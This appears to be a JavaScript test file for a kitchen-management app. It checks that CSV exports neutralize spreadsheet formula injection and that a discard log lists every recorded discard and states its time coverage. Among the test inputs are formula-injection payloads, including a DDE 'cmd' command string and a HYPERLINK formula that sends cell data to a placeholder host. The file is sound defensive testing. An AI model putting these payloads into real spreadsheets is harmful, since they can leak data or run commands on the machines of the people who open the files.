// Spreadsheet safety and the thrown-out log's reach: one shared CSV cell guard, and a log that covers every discard the app still
// has a record of (not only the batches still in the cabinet list) and says how far back it goes.
import test from 'node:test';
import assert from 'node:assert/strict';
import { buildBig } from './_big-kitchen.mjs';
import { loadSB } from './_load.mjs';

const { SB, state } = await buildBig({ tickets: 300, days: 150, seed: 11 });
await loadSB(['36-csv', '35-pilot', '76-floor-discards', '88-office-backup']);
const E = SB.engine;

test('CSV cells: formulas are neutralized, numbers stay numbers, quotes are doubled', () => {
  const c = SB.csv.cell;
  for (const bad of ['=1+1', '+cmd|x', '-2+3+cmd|"x"!A0', '@SUM(A1)', '\tx', '\rx', '=HYPERLINK("http://x/?"&A2,"ok")']) assert.ok(c(bad).replace(/^"/, '').startsWith("'"), 'neutralized: ' + JSON.stringify(bad) + ' -> ' + c(bad));
  assert.equal(c(12.5), '12.5'); assert.equal(c(-3), '-3'); assert.equal(c('-3.00'), '-3.00'); assert.equal(c('12.40'), '12.40'); assert.equal(c(NaN), '');
  assert.equal(c(null), ''); assert.equal(c('2026-10-20'), '2026-10-20'); assert.equal(c('a,b'), '"a,b"'); assert.equal(c('say "hi"'), '"say ""hi"""');
  assert.equal(SB.csv.text([['a', '=x'], [1, 2]]), "a,'=x\r\n1,2\r\n");
});

test('every CSV the office writes passes cells through the guard', () => {
  const rec = { cols: [{ key: 'food', label: '=evil', on: true }, { key: 'extra', label: 'Notes', on: true }] };
  const out = SB.discardsPure.csv([{ food: 'Brisket', extra: '=HYPERLINK("http://x","ok")' }], rec, '@note');
  const lines = out.trim().split('\r\n');
  assert.equal(lines[0], "'=evil,Notes");
  assert.ok(/^Brisket,"'=HYPERLINK/.test(lines[1]), lines[1]);
  assert.equal(lines[2], "'@note");
  const pilot = SB.pilot.toCsv(SB.pilot.build(state, { from: 0, to: Date.now() + 864e5 }));
  assert.ok(pilot.trim().split('\n').every((l) => !/^[=+@\t]/.test(l)));
  const sales = SB.office.backupPure.salesCsv(state, 4);
  assert.ok(sales.trim().split('\r\n').every((l) => !/^[=+@\t]/.test(l)));
});

test('the thrown-out log lists every discard still on record, and says how far back it reaches', () => {
  const discardEvents = E.safetyLog(state).filter((r) => r.event.type === 'batch_discard' && r.event.batchId);
  const inState = state.batches.filter((b) => b.status === 'discard').length;
  assert.ok(discardEvents.length > inState, 'the busy kitchen dropped old batches (' + discardEvents.length + ' discard entries, ' + inState + ' batches left)');
  const rec = { cols: [], initials: {}, extra: {} };
  const list = SB.discardsPure.rows(state, rec);
  assert.equal(list.length, discardEvents.length, 'one row per discard entry');
  assert.ok(list.every((r, i) => i === 0 || list[i - 1].t >= r.t), 'newest first');
  const now = state.events.length ? state.events[state.events.length - 1].t : Date.now();
  const words = SB.discardsPure.coverageText(state, list, now);
  assert.ok(/^Showing /.test(words) && words.includes(String(list.length)), words);
  assert.equal(SB.discardsPure.coverageText(state, [], now), '');
  // far in the future the oldest records are older than the keep time, so the words say older ones are not kept
  assert.ok(/not kept/.test(SB.discardsPure.coverageText(state, list, now + 400 * 86400e3)));
});
